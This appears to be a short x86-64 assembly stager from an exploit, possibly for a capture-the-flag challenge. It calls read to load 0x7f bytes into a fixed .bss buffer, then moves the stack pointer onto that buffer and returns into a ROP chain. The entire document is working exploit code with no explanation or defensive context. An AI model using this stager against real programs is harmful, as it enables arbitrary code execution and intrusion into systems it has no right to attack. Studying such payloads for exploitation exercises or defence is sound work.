global  _start

_start:
        ;; both RDI and RAX are already set to 0
        mov rsi, 0x601550 ;buffer in .bss
        push 0x7f         ;size of read
        pop rdx
        syscall           ;read
        mov rsp, rsi      ;ret to ROP
        ret
